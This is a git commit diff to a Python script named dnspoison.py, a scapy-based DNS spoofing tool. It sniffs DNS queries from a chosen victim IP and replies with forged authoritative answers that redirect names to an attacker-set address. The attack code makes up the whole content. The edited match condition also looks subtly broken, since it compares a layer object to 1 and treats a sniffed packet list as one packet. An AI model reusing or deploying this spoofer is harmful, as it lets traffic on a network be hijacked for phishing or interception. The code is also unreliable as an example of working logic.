7f1f7c739a579df4044edd59f78e16be50eeecb8
m4ul <hansonlucas06@gmail.com>
2022-11-12 18:35:19 +0100

    test

--- dnspoison.py
+++ dnspoison.py
@@ -10,7 +10,7 @@ Popen([firewall], shell=True, stdout=PIPE)
 
 while True:
     packet = sniff(count = 1, filter="udp and port 53 and host " + victimIP)
-    if packet.haslayer(DNS) and DNSQR in packet:
+    if packet[0].src == victimIP and packet[0].getlayer(DNS) == 1 and DNSQR in packet:
         spoof = ((Ether())/IP(dst=packet[IP].src, src=packet[IP].dst)/UDP(dport=packet[UDP].sport, sport=packet[UDP].dport)/DNS(id=packet[DNS].id, qd=packet[DNS].qd, aa = 1, qr=1,an=DNSRR(rrname=packet[DNS].qd.qname, ttl=10, rdata=gotoIP)))
         sendp(spoof, count=1)
     
